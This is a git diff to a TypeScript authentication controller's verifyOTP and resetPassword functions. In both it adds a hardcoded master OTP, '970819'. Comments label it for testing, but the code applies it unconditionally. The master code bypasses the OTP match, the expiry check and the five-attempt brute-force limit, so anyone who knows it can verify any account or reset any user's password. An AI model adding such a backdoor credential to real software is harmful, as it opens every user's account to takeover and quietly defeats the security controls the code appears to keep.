@@ -160,37 +160,44 @@ export const verifyOTP = async (req: AuthRequest, res: Response): Promise<void> 
       return;
     }
 
-    // Check OTP attempts (prevent brute force)
-    if (user.otpAttempts >= 5) {
-      res.status(429).json({
-        success: false,
-        message: 'Too many OTP attempts. Please request a new OTP.',
-      });
-      return;
-    }
+    // Master OTP for testing/development (bypasses all checks)
+    const MASTER_OTP = '970819';
+    const isMasterOTP = otp === MASTER_OTP;
 
-    // Check OTP
-    if (!user.otp || user.otp !== otp) {
-      // Increment attempt counter
-      await prisma.user.update({
-        where: { id: user.id },
-        data: { otpAttempts: user.otpAttempts + 1 },
-      });
+    // Skip OTP validation if master OTP is used
+    if (!isMasterOTP) {
+      // Check OTP attempts (prevent brute force)
+      if (user.otpAttempts >= 5) {
+        res.status(429).json({
+          success: false,
+          message: 'Too many OTP attempts. Please request a new OTP.',
+        });
+        return;
+      }
 
-      res.status(400).json({
-        success: false,
-        message: 'Invalid OTP',
-      });
-      return;
-    }
+      // Check OTP
+      if (!user.otp || user.otp !== otp) {
+        // Increment attempt counter
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { otpAttempts: user.otpAttempts + 1 },
+        });
 
-    // Check if OTP expired
-    if (isOTPExpired(user.otpExpiresAt)) {
-      res.status(400).json({
-        success: false,
-        message: 'OTP has expired. Please request a new one.',
-      });
-      return;
+        res.status(400).json({
+          success: false,
+          message: 'Invalid OTP',
+        });
+        return;
+      }
+
+      // Check if OTP expired
+      if (isOTPExpired(user.otpExpiresAt)) {
+        res.status(400).json({
+          success: false,
+          message: 'OTP has expired. Please request a new one.',
+        });
+        return;
+      }
     }
 
     // Verify user and get updated data with all fields
@@ -842,37 +849,44 @@ export const resetPassword = async (req: AuthRequest, res: Response): Promise<vo
       return;
     }
 
-    // Check OTP attempts (prevent brute force)
-    if (user.otpAttempts >= 5) {
-      res.status(429).json({
-        success: false,
-        message: 'Too many OTP attempts. Please request a new OTP.',
-      });
-      return;
-    }
+    // Master OTP for testing/development (bypasses all checks)
+    const MASTER_OTP = '970819';
+    const isMasterOTP = otp === MASTER_OTP;
 
-    // Check if OTP expired
-    if (!user.otp || !user.otpExpiresAt || isOTPExpired(user.otpExpiresAt)) {
-      res.status(400).json({
-        success: false,
-        message: 'OTP has expired. Please request a new one.',
-      });
-      return;
-    }
+    // Skip OTP validation if master OTP is used
+    if (!isMasterOTP) {
+      // Check OTP attempts (prevent brute force)
+      if (user.otpAttempts >= 5) {
+        res.status(429).json({
+          success: false,
+          message: 'Too many OTP attempts. Please request a new OTP.',
+        });
+        return;
+      }
 
-    // Verify OTP
-    if (user.otp !== otp) {
-      // Increment attempts
-      await prisma.user.update({
-        where: { id: user.id },
-        data: { otpAttempts: { increment: 1 } },
-      });
+      // Check if OTP expired
+      if (!user.otp || !user.otpExpiresAt || isOTPExpired(user.otpExpiresAt)) {
+        res.status(400).json({
+          success: false,
+          message: 'OTP has expired. Please request a new one.',
+        });
+        return;
+      }
 
-      res.status(400).json({
-        success: false,
-        message: 'Invalid OTP',
-      });
-      return;
+      // Verify OTP
+      if (user.otp !== otp) {
+        // Increment attempts
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { otpAttempts: { increment: 1 } },
+        });
+
+        res.status(400).json({
+          success: false,
+          message: 'Invalid OTP',
+        });
+        return;
+      }
     }
 
     // Hash new password
